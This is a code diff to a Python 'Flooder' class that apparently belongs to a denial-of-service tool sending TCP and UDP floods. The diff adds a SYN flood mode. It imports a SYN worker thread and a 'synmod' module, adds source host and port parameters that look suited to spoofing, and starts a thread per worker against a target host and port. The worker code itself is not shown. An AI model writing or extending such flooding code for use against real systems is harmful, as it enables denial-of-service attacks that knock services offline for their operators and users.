@@ -3,10 +3,12 @@ from Events import *
 from main import *
 from UDPWorkerThread import *
 from TCPWorkerThread import *
+from SYNWorkerThread import *
+import synmod
 
 class Flooder:
 
-    def __init__(self, host, port, timeout, method, threads, subsite = None, message = None, Random = False, wait = None):
+    def __init__(self, host, port, timeout, method, threads, subsite, message, Random, wait, srchost, srcport):
         self.host = host
         self.port = port
         self.timeout = timeout
@@ -20,11 +22,15 @@ class Flooder:
         self.random = random
         self.threadId = 0
         self.byteCount = Queue.Queue()
+        self.srchost = srchost
+        self.srcport = srcport
 
         if method == TCP_METHOD or method == UDP_METHOD:
             if message == None and random == False:
                 print "Message missing, not starting."
                 return
+        elif method == SYN_METHOD:
+            synmod.init(srchost, srcport, host, port)
         if method == HTTP_METHOD:
             print "Not yet implemented, not starting."
             return
@@ -35,10 +41,12 @@ class Flooder:
 
         for x in range(self.threadsAmount):
             p = None
-            if method == TCP_METHOD:
+            if self.method == TCP_METHOD:
 	            p = TCPWorkerThread(self, self.threadId)
-            elif method == UDP_METHOD:
+            elif self.method == UDP_METHOD:
 	            p = UDPWorkerThread(self, self.threadId)
+            elif self.method == SYN_METHOD:
+	            p = SYNWorkerThread(self, self.threadId)
             self.threadId += 1
             self.__processes.append(p)
             p.start()
